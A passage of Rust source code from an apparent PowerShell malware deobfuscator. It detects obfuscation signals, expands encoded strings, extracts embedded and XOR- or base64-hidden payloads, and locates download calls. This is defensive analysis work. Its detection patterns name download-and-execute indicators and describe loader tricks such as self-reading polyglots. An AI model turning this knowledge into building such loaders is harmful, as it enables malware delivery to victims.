                out = expand_json_script_base64(&out);
            }
            if signals.regex_replace_base64 {
                out = expand_regex_replace_base64_variables(&out);
            }
            if signals.regex_replace {
                out = expand_regex_replace_calls(&out);
            }
            if signals.base64_or_getstring {
                out = expand_getstring_base64_literals(&out);
                out = expand_getstring_base64_variables(&out);
                out = expand_getstring_byte_arrays(&out);
                out = expand_convert_frombase64_literals(&out);
                out = append_decoded_frombase64_literals(&out);
                out = expand_base64_literals(&out);
                out = expand_getstring_wrapper(&out);
            }
        });
        profile_expand_step!("join_family", iter, {
            if signals.reverse_slice_join {
                out = expand_reverse_string_slice_join(&out);
            }
            if signals.join {
                out = expand_single_literal_join(&out);
                out = expand_split_join_literals(&out);
                out = expand_ps_unary_join(&out);
                out = expand_ps_join(&out);
            }
        });
        profile_expand_step!("replace_family", iter, {
            if signals.to_char_array {
                out = expand_tochararray_reverse_join(&out);
            }
            if signals.string_join {
                out = expand_ps_string_join(&out);
            }
            if signals.string_concat {
                out = expand_ps_string_concat_static(&out);
            }
            if signals.replace {
                out = expand_ps_replace(&out);
                out = expand_literal_replace_extractor_calls(&out);
            }
            if signals.dot_replace {
                out = expand_ps_dot_replace(&out);
            }
            if signals.trim_extractor {
                out = expand_literal_trim_extractor_calls(&out);
            }
            if signals.substring {
                out = expand_ps_dot_substring(&out);
                out = expand_literal_substring_extractor_calls(&out);
            }
            if signals.remove_extractor {
                out = expand_literal_remove_extractor_calls(&out);
            }
            if signals.insert_extractor {
                out = expand_literal_insert_extractor_calls(&out);
            }
            if signals.string_case_extractor {
                out = expand_literal_string_case_extractor_calls(&out);
            }
            if signals.literal_concat_extractor {
                out = expand_literal_concat_extractor_calls(&out);
            }
            if signals.literal_index_extractor {
                out = expand_literal_index_extractor_calls(&out);
            }
            if signals.split_index {
                out = expand_literal_split_index_extractor_calls(&out);
            }
        });
        let mut variables_changed = false;
        profile_expand_step!("variables", iter, {
            if signals.variables {
                let before_variables = out.clone();
                out = expand_ps_index_concat_assignments(&out);
                out = expand_ps_variables(&out);
                variables_changed = out != before_variables;
            }
        });
        profile_expand_step!("post_variables", iter, {
            if variables_changed {
                if signals.xor_base64_function {
                    out = expand_xor_base64_function_calls(&out);
                }
                if signals.regex_replace {
                    out = expand_regex_replace_calls(&out);
                }
                if signals.compressed_base64 {
                    out = expand_gzip_function_base64_variables(&out);
                }
                if signals.char_cast {
                    out = expand_string_join_char_arrays(&out);
                    out = expand_unary_join_char_arrays(&out);
                }
                if signals.base64_or_getstring {
                    out = expand_getstring_base64_literals(&out);
                    out = expand_getstring_base64_variables(&out);
                    out = expand_getstring_byte_arrays(&out);
                    out = expand_convert_frombase64_literals(&out);
                    out = append_decoded_frombase64_literals(&out);
                    out = expand_base64_literals(&out);
                    out = expand_getstring_wrapper(&out);
                }
            }
        });
        if out == before {
            break;
        }
    }
    out
}

struct PsObfuscationSignals {
    argument_list: bool,
    invoke_wrapper: bool,
    dot_replace: bool,
    trim_extractor: bool,
    substring: bool,
    remove_extractor: bool,
    insert_extractor: bool,
    string_case_extractor: bool,
    literal_concat_extractor: bool,
    literal_index_extractor: bool,
    split_index: bool,
    embedded_single_quote_assignment: bool,
    doubled_single_quote: bool,
    skip_nth: bool,
    char_cast: bool,
    hex_split: bool,
    space_concat: bool,
    single_quote_concat: bool,
    double_quote_concat: bool,
    format: bool,
    compressed_base64: bool,
    xor_base64_function: bool,
    json_script_base64: bool,
    regex_replace_base64: bool,
    regex_replace: bool,
    base64_or_getstring: bool,
    reverse_slice_join: bool,
    join: bool,
    to_char_array: bool,
    string_join: bool,
    string_concat: bool,
    replace: bool,
    variables: bool,
}

impl PsObfuscationSignals {
    fn new(text: &str) -> Self {
        let lower = text.to_ascii_lowercase();
        let argument_list = lower.contains("-argumentlist");
        let has_function_def = lower.contains("function ")
            || lower.contains("-name ")
            || lower.contains("-n ")
            || lower.contains("new-item")
            || lower.contains("set-item")
            || has_new_item_alias_signal(&lower)
            || has_set_item_alias_signal(&lower);
        let invoke_wrapper = has_function_def && lower.contains("invoke-expression");
        let dot_replace = lower.contains(".replace");
        let trim_extractor = has_function_def && lower.contains(".trim");
        let substring = lower.contains(".substring");
        let remove_extractor = has_function_def && lower.contains(".remove");
        let insert_extractor = has_function_def && lower.contains(".insert");
        let string_case_extractor =
            has_function_def && (lower.contains(".tolower") || lower.contains(".toupper"));
        let literal_concat_extractor = has_function_def
            && (text.contains('+')
                || lower.contains("string]::concat")
                || lower.contains("string]::join")
                || lower.contains("string]::format")
                || lower.contains("-f"))
            && has_static_ps_literal_quote(text);
        let literal_index_extractor = has_function_def
            && (lower.contains('[')
                || lower.contains(".chars")
                || lower.contains(".get_chars")
                || lower.contains(".tochararray"))
            && has_static_ps_literal_quote(text);
        let split_index =
            has_function_def && has_split_index_extractor_signal(&lower) && text.contains('[');
        let embedded_single_quote_assignment = has_embedded_single_quote_assignment_signal(text);
        let doubled_single_quote = text.contains("''");
        let skip_nth = has_function_def
            && lower.contains("+=")
            && ((lower.contains("do")
                && (lower.contains("until") || lower.contains("while"))
                && text.contains('['))
                || (lower.contains("for") && lower.contains("invoke") && text.contains("'su'")));
        let char_cast = lower.contains("[char");
        let hex_split = lower.contains("-split") && lower.contains("toint16");
        let space_concat = text.contains("' ") && (text.contains(" '") || text.contains("\t'"));
        let single_quote_concat = text.contains('\'') && text.contains('+');
        let double_quote_concat = text.contains('"') && text.contains('+');
        let format = lower.contains("-f") || lower.contains("string]::format");
        let compressed_base64 = (lower.contains("gzipstream") || lower.contains("deflatestream"))
            && lower.contains("base64");
        let xor_base64_function = has_function_def
            && (text.contains('@') || lower.contains("[byte"))
            && text.contains('(')
            && text.contains('\'');
        let json_script_base64 = lower.contains("convertfrom-json")
            && lower.contains("script")
            && lower.contains("frombase64string");
        let regex_replace = lower.contains("[regex]::replace");
        let regex_replace_base64 = regex_replace && lower.contains("frombase64string");
        let base64_or_getstring = lower.contains("base64")
            || lower.contains("frombase64string")
            || lower.contains(".getstring");
        let reverse_slice_join = lower.contains("-join") && lower.contains("-1..-");
        let join = lower.contains("-join")
            || lower.contains("-split")
            || lower.contains("-isplit")
            || lower.contains("-csplit");
        let to_char_array = lower.contains("tochararray") && lower.contains("reverse");
        let string_join = lower.contains("string]::join");
        let string_concat = lower.contains("string]::concat");
        let replace = lower.contains("replace");
        let variables = text.contains('$');

        Self {
            argument_list,
            invoke_wrapper,
            dot_replace,
            trim_extractor,
            substring,
            remove_extractor,
            insert_extractor,
            string_case_extractor,
            literal_concat_extractor,
            literal_index_extractor,
            split_index,
            embedded_single_quote_assignment,
            doubled_single_quote,
            skip_nth,
            char_cast,
            hex_split,
            space_concat,
            single_quote_concat,
            double_quote_concat,
            format,
            compressed_base64,
            xor_base64_function,
            json_script_base64,
            regex_replace_base64,
            regex_replace,
            base64_or_getstring,
            reverse_slice_join,
            join,
            to_char_array,
            string_join,
            string_concat,
            replace,
            variables,
        }
    }

    fn has_any_expansion_signal(&self) -> bool {
        self.argument_list
            || self.invoke_wrapper
            || self.dot_replace
            || self.trim_extractor
            || self.substring
            || self.remove_extractor
            || self.insert_extractor
            || self.string_case_extractor
            || self.literal_concat_extractor
            || self.literal_index_extractor
            || self.split_index
            || self.embedded_single_quote_assignment
            || self.doubled_single_quote
            || self.skip_nth
            || self.char_cast
            || self.hex_split
            || self.space_concat
            || self.single_quote_concat
            || self.double_quote_concat
            || self.format
            || self.compressed_base64
            || self.json_script_base64
            || self.regex_replace_base64
            || self.regex_replace
            || self.base64_or_getstring
            || self.reverse_slice_join
            || self.join
            || self.to_char_array
            || self.string_join
            || self.string_concat
            || self.replace
            || self.variables
    }
}

fn has_split_index_extractor_signal(lower: &str) -> bool {
    lower.contains(".split")
        || lower.contains("-split")
        || lower.contains("-isplit")
        || lower.contains("-csplit")
}

fn has_embedded_single_quote_assignment_signal(text: &str) -> bool {
    text.lines().any(|line| {
        let Some(triple_quote_pos) = line.find("'''") else {
            return false;
        };
        let before = &line[..triple_quote_pos];
        let before_assignment = before.trim_end();
        if !before_assignment.ends_with('=') {
            return false;
        }
        let Some(dollar_pos) = before.rfind('$') else {
            return false;
        };
        before[dollar_pos..].contains('=')
    })
}

fn join_powershell_line_continuations(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for chunk in text.split_inclusive('\n') {
        let (line, had_newline) = match chunk.strip_suffix('\n') {
            Some(line) => (line.strip_suffix('\r').unwrap_or(line), true),
            None => (chunk, false),
        };
        let continuation_end = line.trim_end_matches([' ', '\t']);
        if let Some(prefix) = continuation_end.strip_suffix('`') {
            out.push_str(prefix);
            continue;
        }
        out.push_str(line);
        if had_newline {
            out.push('\n');
        }
    }
    out
}

fn normalize_powershell_quotes(text: &str) -> String {
    if !text
        .chars()
        .any(|c| matches!(c, '\u{2018}' | '\u{2019}' | '\u{201C}' | '\u{201D}'))
        && !text.contains("\\\"")
        && !text.contains("`\"")
    {
        return text.to_string();
    }
    let normalized: String = text
        .chars()
        .map(|c| match c {
            '\u{2018}' | '\u{2019}' => '\'',
            '\u{201C}' | '\u{201D}' => '"',
            _ => c,
        })
        .collect();
    normalized.replace("\\\"", "\"").replace("`\"", "\"")
}

fn strip_marker_noise(text: &str) -> String {
    let mut out = String::with_capacity(text.len());
    for chunk in text.split_inclusive('\n') {
        let (line, newline) = match chunk.strip_suffix('\n') {
            Some(line) => (line, "\n"),
            None => (chunk, ""),
        };
        if should_skip_marker_noise_line(line) {
            out.push_str(line);
        } else {
            out.push_str(&strip_marker_noise_preserving_base64(line));
        }
        out.push_str(newline);
    }
    out
}

fn should_skip_marker_noise_line(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains(".replace(")
        || lower.contains("::replace(")
        || lower.contains("-replace")
        || lower.contains("-ireplace")
        || lower.contains("-creplace")
        || (lower.contains("-split") && lower.contains("-join"))
        || (lower.contains("-isplit") && lower.contains("-join"))
        || (lower.contains("-csplit") && lower.contains("-join"))
        || lower.contains("gzipstream")
        || lower.contains("readtoend")
        || lower.contains("function ")
        || lower.contains("for(")
}

fn strip_marker_noise_preserving_base64(text: &str) -> String {
    let spans = crate::marker_noise::decodable_base64_spans(text);
    if spans.is_empty() {
        return crate::marker_noise::strip_line(text);
    }

    let mut out = String::with_capacity(text.len());
    let mut cursor = 0usize;
    for (start, end) in spans {
        if start > cursor {
            out.push_str(&crate::marker_noise::strip_line(&text[cursor..start]));
        }
        out.push_str(&text[start..end]);
        cursor = end;
    }
    if cursor < text.len() {
        out.push_str(&crate::marker_noise::strip_line(&text[cursor..]));
    }
    out
}

/// Decode a ps1 payload to a String, handling UTF-16LE (from -EncodedCommand).
///
/// Heuristic: if at least half the even-offset bytes are non-zero and at
/// least half the odd-offset bytes are zero, treat as UTF-16LE.
fn decode_payload(bytes: &[u8]) -> std::borrow::Cow<'_, str> {
    if bytes.len() >= 4 && is_utf16le(bytes) {
        let u16s: Vec<u16> = bytes
            .chunks_exact(2)
            .map(|b| u16::from_le_bytes([b[0], b[1]]))
            .collect();
        String::from_utf16_lossy(&u16s).into()
    } else {
        String::from_utf8_lossy(bytes)
    }
}

pub fn normalize_ps1_text(text: &str) -> String {
    let expanded = strip_marker_noise(&expand_obfuscation(&strip_marker_noise(text)));
    normalize_expanded_ps1_text(&expanded)
}

fn normalize_expanded_ps1_text(expanded: &str) -> String {
    let expanded = strip_marker_noise(expanded);
    let aliased = crate::ps_alias::expand_aliases_if_ps(&expanded);
    let summarized = summarize_large_binary_ps_literals(&aliased);
    escape_binary_controls(&summarized)
}

pub fn normalize_ps1_payload(bytes: &[u8]) -> String {
    let raw_text = decode_payload(bytes);
    normalize_ps1_text(&raw_text)
}

fn escape_binary_controls(text: &str) -> String {
    if !text
        .chars()
        .any(|c| c.is_control() && !matches!(c, '\r' | '\n' | '\t'))
    {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len());
    for c in text.chars() {
        if c.is_control() && !matches!(c, '\r' | '\n' | '\t') {
            use std::fmt::Write as _;
            let _ = write!(out, "\\x{:02X}", c as u32);
        } else {
            out.push(c);
        }
    }
    out
}

fn summarize_large_binary_ps_literals(text: &str) -> String {
    const MIN_LITERAL_BYTES: usize = 4096;

    if !text.contains('\'') {
        return text.to_string();
    }

    let mut out = String::with_capacity(text.len().min(256 * 1024));
    let mut cursor = 0usize;
    while cursor < text.len() {
        let Some(open_rel) = text[cursor..].find('\'') else {
            out.push_str(&text[cursor..]);
            break;
        };
        let open = cursor + open_rel;
        out.push_str(&text[cursor..=open]);

        let mut idx = open + 1;
        let mut close = None;
        while idx < text.len() {
            let Some(rel) = text[idx..].find('\'') else {
                break;
            };
            let quote = idx + rel;
            if text[quote + 1..].starts_with('\'') {
                idx = quote + 2;
                continue;
            }
            close = Some(quote);
            break;
        }

        let Some(close) = close else {
            out.push_str(&text[open + 1..]);
            break;
        };

        let literal = &text[open + 1..close];
        if literal.len() >= MIN_LITERAL_BYTES && is_binary_looking_ps_literal(literal) {
            out.push_str(&format!(
                "::==== harrington: omitted {} binary-looking bytes from PowerShell string literal ====",
                literal.len()
            ));
        } else {
            out.push_str(literal);
        }
        out.push('\'');
        cursor = close + 1;
    }

    out
}

fn is_binary_looking_ps_literal(literal: &str) -> bool {
    let mut suspicious = 0usize;
    let mut total = 0usize;
    for c in literal.chars() {
        total += 1;
        if c == '\u{fffd}'
            || (c.is_control() && !matches!(c, '\r' | '\n' | '\t'))
            || (!c.is_ascii() && !c.is_alphabetic())
        {
            suspicious += 1;
        }
    }
    total >= 1024 && suspicious * 100 >= total * 20
}

pub fn extract_self_embedded_ps1(env: &mut Environment, deobfuscated: &str) {
    let Some(input_bytes) = env.input_bytes.clone() else {
        return;
    };
    extract_sorted_comment_ps1(env, &input_bytes);

    let source = String::from_utf8_lossy(&input_bytes);
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    for payload in extract_batch_polyglot_ps1_tail(&source) {
        if known.insert(payload.clone()) {
            env.all_extracted_ps1.push(payload);
        }
    }

    if looks_like_self_tail_base64_loader(deobfuscated) {
        for decoded in decode_large_base64_runs_from_source(&source) {
            if known.insert(decoded.clone()) {
                decoded_payloads.push(decoded);
            }
        }
    }

    if env.all_extracted_ps1.is_empty() && decoded_payloads.is_empty() {
        return;
    }

    let payloads = env.all_extracted_ps1.clone();

    for payload in payloads {
        let text = decode_payload(&payload);
        if looks_like_self_tail_base64_loader(&text) {
            for decoded in decode_large_base64_runs_from_source(&source) {
                if known.insert(decoded.clone()) {
                    decoded_payloads.push(decoded);
                }
            }
        }
        if !text.contains("%~f0") && !text.to_ascii_lowercase().contains("get-content") {
            continue;
        }
        for caps in SELF_B64_MATCH_RE.captures_iter(&text) {
            let Some(marker) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            for b64 in find_marker_base64_runs(&source, marker) {
                if b64.len() > 16 * 1024 * 1024 {
                    continue;
                }
                let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
                    continue;
                };
                if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
                    continue;
                }
                if known.insert(decoded.clone()) {
                    decoded_payloads.push(decoded);
                }
            }
        }
    }

    env.all_extracted_ps1.extend(decoded_payloads);
    extract_file_backed_xor_ps1(env, deobfuscated);
}

fn extract_batch_polyglot_ps1_tail(source: &str) -> Vec<Vec<u8>> {
    let lower = source.to_ascii_lowercase();
    let Some(start) = lower.find("<#") else {
        return Vec::new();
    };
    let Some(close_rel) = lower[start + 2..].find("#>") else {
        return Vec::new();
    };
    let close = start + 2 + close_rel;
    let header = &lower[start..close];
    if !header.contains(":batch")
        || !header.contains("powershell")
        || !header.contains("%~f0")
        || !(header.contains("readalltext") || header.contains("get-content"))
    {
        return Vec::new();
    }

    let tail = source[close + 2..].trim_start_matches(['\r', '\n']);
    if tail.is_empty() || !looks_like_powershell_payload(tail.as_bytes()) {
        return Vec::new();
    }
    vec![tail.as_bytes().to_vec()]
}

fn looks_like_self_tail_base64_loader(text: &str) -> bool {
    let lower = text.to_ascii_lowercase();
    lower.contains("get-content") && lower.contains("-raw") && lower.contains("frombase64string")
}

fn decode_large_base64_runs_from_source(source: &str) -> Vec<Vec<u8>> {
    const MIN_B64_RUN: usize = 80;
    const MAX_B64_RUN: usize = 16 * 1024 * 1024;

    let bytes = source.as_bytes();
    let mut out = Vec::new();
    let mut start: Option<usize> = None;
    for (idx, &b) in bytes.iter().enumerate() {
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=') {
            start.get_or_insert(idx);
            continue;
        }
        if let Some(s) = start.take() {
            maybe_decode_source_b64_run(source, s, idx, MIN_B64_RUN, MAX_B64_RUN, &mut out);
        }
    }
    if let Some(s) = start {
        maybe_decode_source_b64_run(source, s, source.len(), MIN_B64_RUN, MAX_B64_RUN, &mut out);
    }
    out
}

fn maybe_decode_source_b64_run(
    source: &str,
    start: usize,
    end: usize,
    min_len: usize,
    max_len: usize,
    out: &mut Vec<Vec<u8>>,
) {
    let len = end.saturating_sub(start);
    if !(min_len..=max_len).contains(&len) {
        return;
    }
    let run = &source[start..end];
    let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(run) else {
        return;
    };
    if decoded.len() > 12 * 1024 * 1024 || !looks_like_powershell_payload(&decoded) {
        return;
    }
    out.push(decoded);
}

fn extract_sorted_comment_ps1(env: &mut Environment, input_bytes: &[u8]) {
    let source = String::from_utf8_lossy(input_bytes);
    let lower = source.to_ascii_lowercase();
    if !lower.contains("sort-object")
        || !lower.contains("startswith(':: ")
        || !lower.contains("substring(0, 10)")
        || !lower.contains("substring(10)")
    {
        return;
    }

    let mut groups: std::collections::BTreeMap<String, Vec<(String, String)>> =
        std::collections::BTreeMap::new();
    for line in source.lines() {
        let Some(rest) = line.strip_prefix(":: ") else {
            continue;
        };
        if rest.len() < 12 {
            continue;
        }
        let (group, rest) = rest.split_at(2);
        let (order, chunk) = rest.split_at(10);
        if !group.bytes().all(|b| b.is_ascii_digit()) || !order.bytes().all(|b| b.is_ascii_digit())
        {
            continue;
        }
        groups
            .entry(group.to_string())
            .or_default()
            .push((order.to_string(), chunk.to_string()));
    }

    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    for (_group, mut chunks) in groups {
        chunks.sort_by(|a, b| a.0.cmp(&b.0));
        let joined: String = chunks.into_iter().map(|(_, chunk)| chunk).collect();
        if joined.len() > 8 * 1024 * 1024 {
            continue;
        }
        let payload = joined.replace("PATH", "%~f0").into_bytes();
        if !looks_like_powershell_payload(&payload) {
            continue;
        }
        if known.insert(payload.clone()) {
            env.all_extracted_ps1.push(payload);
        }
    }
}

fn extract_file_backed_xor_ps1(env: &mut Environment, deobfuscated: &str) {
    if env.all_extracted_ps1.is_empty() {
        return;
    }

    let payloads = env.all_extracted_ps1.clone();
    let mut known: std::collections::HashSet<Vec<u8>> =
        env.all_extracted_ps1.iter().cloned().collect();
    let mut decoded_payloads = Vec::new();

    for payload in payloads {
        let text = decode_payload(&payload);
        let lower = text.to_ascii_lowercase();
        if !lower.contains("frombase64string") || !lower.contains("-bxor") {
            continue;
        }
        let string_bindings = ps_string_bindings(&text);

        for caps in FILE_B64_XOR_LOADER_RE.captures_iter(&text) {
            let Some(key_var) = caps.get(1).map(|m| m.as_str()) else {
                continue;
            };
            let Some(key) = caps.get(2).and_then(|m| m.as_str().parse::<u8>().ok()) else {
                continue;
            };
            let Some(data_var) = caps.get(3).map(|m| m.as_str()) else {
                continue;
            };
            let Some(path) = file_b64_xor_loader_path(&caps, &string_bindings) else {
                continue;
            };
            let Some(from_b64_var) = caps.get(10).map(|m| m.as_str()) else {
                continue;
            };
            let Some(xor_key_var) = caps.get(11).map(|m| m.as_str()) else {
                continue;
            };
            if !data_var.eq_ignore_ascii_case(from_b64_var)
                || !key_var.eq_ignore_ascii_case(xor_key_var)
            {
                continue;
            }

            let Some(content) = filesystem_content_for_path(env, &path)
                .or_else(|| grouped_echo_content_for_path(deobfuscated, &path))
            else {
                continue;
            };
            if content.len() > 16 * 1024 * 1024 {
                continue;
            }
            let b64: String = content
                .iter()
                .copied()
                .filter(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
                .map(char::from)
                .collect();
            if b64.len() < 16 {
                continue;
            }
            let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(b64) else {
                continue;
            };
            if decoded.len() > 12 * 1024 * 1024 {
                continue;
            }
            let xored: Vec<u8> = decoded.into_iter().map(|b| b ^ key).collect();
            if !looks_like_powershell_payload(&xored) {
                continue;
            }
            if known.insert(xored.clone()) {
                decoded_payloads.push(xored);
            }
        }
    }

    env.all_extracted_ps1.extend(decoded_payloads);
}

fn file_b64_xor_loader_path(
    caps: &regex::Captures<'_>,
    string_bindings: &std::collections::HashMap<String, String>,
) -> Option<String> {
    for literal_idx in [4, 6, 8] {
        if let Some(path) = caps.get(literal_idx).map(|m| m.as_str()) {
            return Some(path.to_string());
        }
    }
    for var_idx in [5, 7, 9] {
        let Some(var) = caps.get(var_idx).map(|m| m.as_str()) else {
            continue;
        };
        if let Some(path) = string_bindings.get(&var.to_ascii_lowercase()) {
            return Some(path.clone());
        }
    }
    None
}

fn filesystem_content_for_path(env: &Environment, path: &str) -> Option<Vec<u8>> {
    let key = normalize_fs_lookup_path(path);
    if let Some(content) = env
        .modified_filesystem
        .iter()
        .find_map(|(candidate, entry)| {
            if normalize_fs_lookup_path(candidate) == key {
                fs_entry_content(entry)
            } else {
                None
            }
        })
    {
        return Some(content);
    }

    let basename = windows_basename(&key)?;
    env.modified_filesystem
        .iter()
        .find_map(|(candidate, entry)| {
            if windows_basename(&normalize_fs_lookup_path(candidate))
                .is_some_and(|candidate_basename| candidate_basename == basename)
            {
                fs_entry_content(entry)
            } else {
                None
            }
        })
}

fn windows_basename(path: &str) -> Option<&str> {
    path.rsplit('\\').next().filter(|name| !name.is_empty())
}

fn grouped_echo_content_for_path(deobfuscated: &str, path: &str) -> Option<Vec<u8>> {
    let wanted = normalize_fs_lookup_path(path);
    let mut in_group = false;
    let mut chunks: Vec<String> = Vec::new();

    for line in deobfuscated.lines() {
        let trimmed = line.trim();
        if trimmed == "(" {
            in_group = true;
            chunks.clear();
            continue;
        }
        if !in_group {
            continue;
        }
        if let Some(target) = redirected_group_target(trimmed) {
            if normalize_fs_lookup_path(target) == wanted {
                let mut content = Vec::new();
                for chunk in chunks {
                    content.extend_from_slice(chunk.as_bytes());
                    content.extend_from_slice(b"\r\n");
                }
                return Some(content);
            }
            in_group = false;
            chunks.clear();
            continue;
        }
        if let Some(rest) = trimmed.strip_prefix("echo ") {
            chunks.push(rest.to_string());
        }
    }

    None
}

fn redirected_group_target(line: &str) -> Option<&str> {
    let rest = line
        .strip_prefix(")>>")
        .or_else(|| line.strip_prefix(")>"))?
        .trim();
    rest.trim_matches('"').split_ascii_whitespace().next()
}

fn fs_entry_content(entry: &FsEntry) -> Option<Vec<u8>> {
    match entry {
        FsEntry::Content { content, .. } | FsEntry::Decoded { content, .. } => {
            Some(content.clone())
        }
        FsEntry::Directory | FsEntry::Download { .. } | FsEntry::Copy { .. } => None,
    }
}

fn normalize_fs_lookup_path(path: &str) -> String {
    let mut out = String::with_capacity(path.len());
    let mut last_was_backslash = false;
    for c in path.trim_matches('"').trim_matches('\'').chars() {
        let c = if c == '/' {
            '\\'
        } else {
            c.to_ascii_lowercase()
        };
        if c == '\\' {
            if !last_was_backslash {
                out.push(c);
            }
            last_was_backslash = true;
        } else {
            out.push(c);
            last_was_backslash = false;
        }
    }
    out
}

fn find_marker_base64_runs(source: &str, marker: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut search_from = 0;
    while let Some(rel) = source[search_from..].find(marker) {
        let start = search_from + rel + marker.len();
        let rest = &source[start..];
        let b64_len = rest
            .bytes()
            .take_while(|b| b.is_ascii_alphanumeric() || matches!(*b, b'+' | b'/' | b'='))
            .count();
        if b64_len >= 32 {
            out.push(rest[..b64_len].to_string());
        }
        search_from = start.saturating_add(b64_len.max(1));
    }
    out
}

fn looks_like_powershell_payload(bytes: &[u8]) -> bool {
    let text = decode_payload(bytes);
    let lower = text.to_ascii_lowercase();
    lower.contains("invoke-")
        || lower.contains("new-object")
        || lower.contains("downloadstring")
        || lower.contains("downloadfile")
        || lower.contains("start-process")
        || lower.contains("powershell")
        || lower.contains("frombase64string")
        || lower.contains("iex ")
        || lower.contains("http://")
        || lower.contains("https://")
}

fn is_utf16le(bytes: &[u8]) -> bool {
    if bytes.len() < 4 {
        return false;
    }
    // Check BOM first
    if bytes[0] == 0xFF && bytes[1] == 0xFE {
        return true;
    }
    // Heuristic: odd-offset bytes are mostly zero (ASCII codepoints in UTF-16LE)
    let sample = &bytes[..bytes.len().min(256)];
    let pairs = sample.len() / 2;
    if pairs == 0 {
        return false;
    }
    let odd_zeros = sample.chunks_exact(2).filter(|b| b[1] == 0).count();
    odd_zeros * 2 >= pairs // >= 50% of odd bytes are zero
}

fn dynamic_download_invoke_downloads(text: &str) -> Vec<(String, Option<String>)> {
    let mut foreach_urls: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();
    let mut array_bindings: std::collections::HashMap<String, Vec<String>> =
        std::collections::HashMap::new();

    for caps in PS_ARRAY_LITERAL_ASSIGN_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(body) = caps.get(2) else {
            continue;
        };
        let urls = ps_literal_urls(body.as_str());
        if !urls.is_empty() {
            array_bindings.insert(var.as_str().to_ascii_lowercase(), urls);
        }
    }

    for caps in FOREACH_LITERAL_ARRAY_RE.captures_iter(text) {
        let Some(var) = caps.get(1) else {
            continue;
        };
        let Some(body) = caps.get(2) else {
            continue;
        };
        let urls = ps_literal_urls(body.as_str());
        if !urls.is_empty() {
            foreach_urls.insert(var.as_str().to_ascii_lowercase(), urls);
        }
    }

    for caps in FOREACH_ARRAY_VAR_RE.captures_iter(text) {
        let (Some(item_var), Some(array_var)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let Some(urls) = array_bindings.get(&array_var.as_str().to_ascii_lowercase()) else {
            continue;
        };
        foreach_urls.insert(item_var.as_str().to_ascii_lowercase(), urls.clone());
    }

    let mut seen = std::collections::HashSet::new();
    let mut downloads = Vec::new();
    let bindings = ps_dynamic_download_bindings(text);
    for caps in DYNAMIC_DOWNLOAD_INVOKE_RE.captures_iter(text) {
        let method = caps
            .name("single_method")
            .or_else(|| caps.name("double_method"))
            .or_else(|| caps.name("bare_method"))
            .map(|m| m.as_str().to_string())
            .or_else(|| {
                caps.name("method_var")
                    .and_then(|m| bindings.get(&m.as_str().to_ascii_lowercase()).cloned())
            });
        let Some(method) = method.filter(|method| is_dynamic_download_method(method)) else {
            continue;
        };
        let Some(args) = caps
            .name("args")
            .map(|m| split_ps_top_level_args(m.as_str()))
        else {
            continue;
        };
        let Some(src_arg) = args.first() else {
            continue;
        };
        let dst = if method.to_ascii_lowercase().starts_with("downloadfile") {
            args.get(1).and_then(|arg| ps_string_arg(arg, &bindings))
        } else {
            None
        };

        if let Some(url) = ps_literal_url_arg(src_arg).or_else(|| ps_url_arg(src_arg, &bindings)) {
            if seen.insert((url.clone(), dst.clone())) {
                downloads.push((url, dst));
            }
            continue;
        };

        let Some(var) = src_arg.trim().strip_prefix('$') else {
            continue;
        };
        if !var.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
            continue;
        }
        if let Some(values) = foreach_urls.get(&var.to_ascii_lowercase()) {
            for url in values {
                if seen.insert((url.clone(), dst.clone())) {
                    downloads.push((url.clone(), dst.clone()));
                }
            }
        }
    }
    downloads
}

#[cfg(test)]
fn dynamic_download_invoke_urls(text: &str) -> Vec<String> {
    dynamic_download_invoke_downloads(text)
        .into_iter()
        .map(|(url, _)| url)
        .collect()
}

fn is_dynamic_download_method(method: &str) -> bool {
    let method = method.to_ascii_lowercase();
    method == "down"
        || ["downloadstring", "downloadfile", "downloaddata", "openread"]
            .iter()
            .any(|prefix| {
                if method == *prefix {
                    return true;
                }
                let Some(suffix) = method.strip_prefix(prefix) else {
                    return false;
                };
                matches!(suffix, "async" | "taskasync")
            })
}

pub(crate) fn ps_downloadfile_calls(text: &str) -> Vec<(String, Option<String>)> {
    if !contains_ascii_case_insensitive_bytes(text, b"downloadfile") {
        return Vec::new();
    }

    let mut bindings = None;
    let mut out = Vec::new();
    let mut seen = std::collections::HashSet::new();
    for caps in DOWNLOADFILE_PATH_COMBINE_RE.captures_iter(text) {
        let (Some(src_arg), Some(dst_arg)) = (caps.get(1), caps.get(2)) else {
            continue;
        };
        let Some(url) = ps_literal_url_arg(src_arg.as_str()).or_else(|| {
            let bindings = bindings.get_or_insert_with(|| ps_string_bindings(text));
            ps_url_arg(src_arg.as_str(), bindings)
        }) else {
            continue;
        };
        let Some(dst) = ps_path_combine_arg(dst_arg.as_str()) else {
            continue;
        };
        if !seen.insert((url.clone(), Some(dst.clone()))) {
            continue;
        }
        out.push((url, Some(dst)));
    }
    for caps in DOWNLOADFILE_CALL_RE.captures_iter(text) {
        let Some(args) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let parts = split_ps_top_level_args(args);
        let Some(src_arg) = parts.first() else {
            continue;
        };
        let Some(url) = ps_literal_url_arg(src_arg).or_else(|| {
            let bindings = bindings.get_or_insert_with(|| ps_string_bindings(text));
            ps_url_arg(src_arg, bindings)
        }) else {
            continue;
        };
        let dst = parts.get(1).and_then(|arg| {
            ps_literal_arg(arg).or_else(|| {
                let bindings = bindings.get_or_insert_with(|| ps_string_bindings(text));
                ps_variable_arg(arg, bindings)
            })
        });
